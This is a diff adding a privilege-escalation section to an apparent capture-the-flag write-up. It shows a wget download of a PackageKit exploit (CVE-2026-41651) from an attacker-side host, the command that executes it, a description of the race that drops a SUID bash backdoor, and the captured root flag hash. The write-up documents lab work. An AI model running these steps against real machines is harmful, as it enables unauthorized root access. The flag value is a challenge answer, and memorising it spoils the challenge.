@@ -54,3 +54,13 @@ LinPEAS flagged a high-value local privilege escalation lead in PackageKit:
 ![PackageKit CVE-2026-41651 Detection](assets/12-linpeas-packagekit.png)
 - **PackageKit (`CVE-2026-41651` / Pack2TheRoot):** Detected PackageKit `1.2.8-2ubuntu1.2`, which is below the Ubuntu 24.04 patched version (`1.2.8-2ubuntu1.5`). CVE-2026-41651 is a TOCTOU race condition on transaction flags in PackageKit that allows local privilege escalation.
 - **Next Step:** Exploit `CVE-2026-41651` (Pack2TheRoot) to escalate from `marimo` to `root` and retrieve `root.txt`.
+
+## 5. Privilege Escalation (`CVE-2026-41651` / Pack2TheRoot)
+Transferred the `CVE-2026-41651` exploit (`wget http://10.10.16.229:8000/CVE-2026-41651.py`) to the target and executed it (`python3 CVE-2026-41651.py`):
+
+![Pack2TheRoot Exploit Execution](assets/13-pack2theroot-exploit.png)
+- **Exploit Mechanics:** The script built dummy and payload `.deb` packages (`/tmp/pk-dummy-54637.deb` and `/tmp/pk-payload-54637.deb`), connected to the system D-Bus to create a PackageKit transaction (`/2_abedebcc`), and raced the `SIMULATE` to `REAL` transaction flags to drop a SUID bash binary at `/var/tmp/.suid_bash`
+- **Root Escalation:** Executing `/var/tmp/.suid_bash` elevated effective privileges to `euid=0(root)` (`whoami` -> `root`)
+
+![Root Shell and Root Flag](assets/14-root-flag.png)
+- **Root Flag:** Navigated to `/root` and retrieved `root.txt` (`0e4e7e50f81cff4e0533669252337a14`)
